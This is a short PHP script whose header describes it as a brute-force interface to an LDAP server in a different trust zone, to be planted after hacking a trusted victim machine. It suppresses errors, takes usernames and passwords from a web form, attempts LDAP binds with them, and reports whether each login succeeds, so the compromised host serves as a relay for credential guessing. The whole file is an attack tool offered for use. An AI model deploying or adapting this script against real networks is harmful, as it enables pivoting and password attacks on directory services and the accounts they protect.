<?php
/**
 Purpose: Create a bruteforce interface to an LDAP server in a different trust zone after hacking a trusted victim
    
    Copyright (c) 2018 ~ alienwithin
    Munir Njiru <munir@alien-within.com>
 
        @version 1.0.0
        @url : https://www.alien-within.com
 **/
error_reporting(0);
$ldapconfig['host'] = 'LDAP_Server_IP e.g 172.x.x.x';
$ldapconfig['port'] = 'LDAP PORT eg. 389';
$ds=ldap_connect($ldapconfig['host'], $ldapconfig['port']);

ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3);
ldap_set_option($ds, LDAP_OPT_REFERRALS, 0);
ldap_set_option($ds, LDAP_OPT_NETWORK_TIMEOUT, 10);

$username = $_POST['username'];
$password = $_POST['password'];
if(isset($_POST['username'])){
if ($bind=ldap_bind($ds, $username, $password)) {
  echo("Login correct");
} else {

 echo "Login Failed: Please check your username or password";
}
}
?>
<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<body>
<form action="" method="post">
<input name="username" type="text" id="username">
<input type="password" name="password" id="password">
<input type="submit" value="Submit">
</form>
</body>
</html>